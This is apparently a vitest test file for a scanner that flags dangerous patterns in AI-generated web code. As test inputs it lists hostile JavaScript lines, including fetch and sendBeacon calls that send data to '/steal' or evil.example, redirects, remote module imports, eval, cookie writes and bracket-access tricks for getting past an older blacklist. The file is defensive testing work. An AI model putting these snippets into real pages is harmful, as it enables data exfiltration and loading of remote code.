import { describe, it, expect } from 'vitest';
import { findDangerousPattern, hasDangerousCode } from './ai-code-guard';

describe('AI 代码危险模式扫描', () => {
  it('合法的模板/动画/码点代码不被误伤', () => {
    const legit = `
      const el2 = document.createElement('div');
      el2.style.cssText = 'color:red';
      el2.textContent = quote.text + quote.author;
      el.replaceChildren(el2);
      el.insertAdjacentHTML('beforeend', '<svg viewBox="0 0 10 10"><circle cx="5" cy="5" r="4"/></svg>');
      return content.animate([{opacity:0},{opacity:1}], {duration: 1000, fill: 'both'});
      ctx.save(); ctx.beginPath(); ctx.arc(x, y, s/2, 0, Math.PI*2); ctx.fillStyle = c; ctx.fill(); ctx.restore();
      const walker = document.createTreeWalker(content, NodeFilter.SHOW_TEXT);
    `;
    expect(findDangerousPattern(legit)).toBeNull();
    expect(hasDangerousCode(legit)).toBe(false);
  });

  it('点访问的全局结构被拦截', () => {
    for (const code of [
      'document.body.append(x)',
      'document.documentElement.style.color = "red"',
      'document.cookie = "a=1"',
      'document.write("x")',
    ]) {
      expect(findDangerousPattern(code), code).not.toBeNull();
    }
  });

  it('方括号访问变体被拦截（旧黑名单的绕过面）', () => {
    for (const code of [
      "document['body'].append(x)",
      'document["body"]',
      "globalThis['fetch']('https://evil.example')",
      "window['location'] = 'https://evil.example'",
      "navigator['sendBeacon']('https://evil.example')",
    ]) {
      expect(findDangerousPattern(code), code).not.toBeNull();
    }
  });

  it('location 跳转（含裸 location）被拦截', () => {
    for (const code of [
      'window.location.href = "https://evil.example"',
      'location.href = "https://evil.example"',
      'top.location = "https://evil.example"',
    ]) {
      expect(findDangerousPattern(code), code).not.toBeNull();
    }
  });

  it('网络与执行类 API 被拦截', () => {
    for (const code of [
      'fetch("/steal?d=" + quote.text)',
      'const x = new XMLHttpRequest()',
      'const ws = new WebSocket("wss://evil.example")',
      'const es = new EventSource("/stream")',
      'const w = new Worker("evil.js")',
      'navigator.sendBeacon("/steal", data)',
      'eval("code")',
      'const f = new Function("return 1")',
      'import("https://evil.example/m.js")',
    ]) {
      expect(findDangerousPattern(code), code).not.toBeNull();
    }
  });

  it('本地存储访问被拦截（防篡改工具自身数据）', () => {
    expect(
      findDangerousPattern('localStorage.setItem("quote-card:custom-templates", "[]")'),
    ).not.toBeNull();
    expect(findDangerousPattern('sessionStorage.clear()')).not.toBeNull();
  });
});
